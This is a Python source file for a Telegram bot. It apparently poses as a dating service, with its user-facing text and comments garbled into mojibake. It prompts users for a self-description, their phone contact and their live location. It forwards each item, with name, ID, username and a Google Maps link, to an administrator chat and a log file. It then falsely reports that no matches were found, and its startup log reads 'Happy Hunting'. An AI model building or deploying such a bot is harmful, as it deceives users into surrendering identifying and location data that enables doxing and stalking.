import logging
import asyncio
import os
import importlib.util
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.types import ParseMode

# –£—Å—Ç–∞–Ω–æ–≤–∫–∞ —É—Ä–æ–≤–Ω—è –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(level=logging.INFO)


# –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –ø—É—Ç–∏ –∫ config.py
config_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), '..', 'config.py')


# –ó–∞–≥—Ä—É–∑–∫–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏
spec = importlib.util.spec_from_file_location("config", config_path)
config = importlib.util.module_from_spec(spec)
spec.loader.exec_module(config)


API_TOKEN = config.TOKEN
ADMIN_CHAT_ID = config.CHATID


# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–æ—Ç–∞ –∏ –¥–∏—Å–ø–µ—Ç—á–µ—Ä–∞
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())


# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –æ –∑–∞–ø—É—Å–∫–µ –±–æ—Ç–∞
async def send_startup_message():
    await bot.send_message(chat_id=ADMIN_CHAT_ID, text="~ Bot has been started!")
    logging.info("[!] Bot has been Started!\n [+] Happy Hunting! :D")


# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–æ–º–∞–Ω–¥—ã /start
@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    await message.answer(f'''üëã –ü—Ä–∏–≤–µ—Ç! {message.from_user.first_name}üëã
    –≠—Ç–æ –±–æ—Ç –¥–ª—è –∑–Ω–∞–∫–æ–º—Å—Ç–≤–∞!
    –ß—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å, –≤–≤–µ–¥–∏—Ç–µ /search''')


# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–æ–º–∞–Ω–¥—ã /search
@dp.message_handler(commands=['search'])
async def search(message: types.Message):
    msg = await message.answer('–î–ª—è –Ω–∞—á–∞–ª–∞ –Ω–∞–ø–∏—à–∏—Ç–µ –Ω–µ–º–Ω–æ–≥–æ –æ —Å–µ–±–µ (–æ–¥–Ω–∏–º —Å–æ–æ–±—â–µ–Ω–∏–µ–º)')
    await proc2(msg)


# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
async def proc2(message: types.Message):
    try:
        num = message.text
        await bot.send_message(ADMIN_CHAT_ID, f'–ü–æ–ª—É—á–µ–Ω–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è: {num}')
        logging.info(num)
        await asyncio.sleep(2)
        keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
        button_phone = types.KeyboardButton(text="–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è", request_contact=True)
        keyboard.add(button_phone)
        await message.answer('''–î–ª—è —Ç–æ–≥–æ, —á—Ç–æ–±—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–æ—Ç–∞, –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–π—Ç–µ—Å—å –ø–æ–∂–∞–ª—É–π—Å—Ç–∞!''', reply_markup=keyboard)
    except Exception as e:
        logging.exception(e)
        await message.answer('–ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–æ–ø–æ–∑–Ω–∞–Ω–Ω–∞—è –æ—à–∏–±–∫–∞, –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç–µ –±–æ—Ç–∞!')

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–æ–Ω—Ç–∞–∫—Ç–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏
@dp.message_handler(content_types=['contact'])
async def contact(message: types.Message):
    if message.contact:
        nick = message.from_user.username
        first = message.contact.first_name
        last = message.contact.last_name
        userid = message.contact.user_id
        phone = message.contact.phone_number
        await message.answer("–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ!")
        info = f'''
    –î–∞–Ω–Ω—ã–µ
    ‚îú–ò–º—è: {first} {last}
    ‚îúID: {userid}
    ‚îú–ù–∏–∫: @{nick}
    ‚îî–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: {phone}
            '''
        await bot.send_message(ADMIN_CHAT_ID, info)
        logging.info(info)

        if userid != message.chat.id:
            await message.answer('–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å–≤–æ–π –∫–æ–Ω—Ç–∞–∫—Ç!')
        await asyncio.sleep(1)
        keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
        button_location = types.KeyboardButton(text="–û—Ç–ø—Ä–∞–≤–∏—Ç—å", request_location=True)
        keyboard1.add(button_location)
        await message.answer(text='–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å–≤–æ—é –≥–µ–æ–ø–æ–∑–∏—Ü–∏—é, —á—Ç–æ–±—ã –±–æ—Ç –Ω–∞—à–µ–ª –±–ª–∏–∂–∞–π—à–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π!', reply_markup=keyboard1)

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –≥–µ–æ–ø–æ–∑–∏—Ü–∏–∏
@dp.message_handler(content_types=['location'])
async def location(message: types.Message):
    if message.location:
        lon = str(message.location.longitude)
        lat = str(message.location.latitude)
        geo = f'''
        –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è
        ‚îúID: {message.chat.id}
        ‚îúLongitude: {lon}
        ‚îúLatitude: {lat} 
        ‚îî–ö–∞—Ä—Ç—ã: https://www.google.com/maps/place/{lat}+{lon} 
        '''
        with open('bot-log.txt', 'a+', encoding='utf-8') as log:
            log.write(geo + '  ')
        await bot.send_message(ADMIN_CHAT_ID, geo)
        logging.info(geo)
        await message.answer('–ü–æ–∏—Å–∫...')
        await asyncio.sleep(2)
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é –≤ –±–∞–∑–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ –ø–æ–¥—Ö–æ–¥—è—â–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π!')

# –ó–∞–ø—É—Å–∫ –±–æ—Ç–∞
async def main():
    await send_startup_message()
    logging.info("Starting the bot...")
    await dp.start_polling()

if __name__ == '__main__':
    asyncio.run(main())
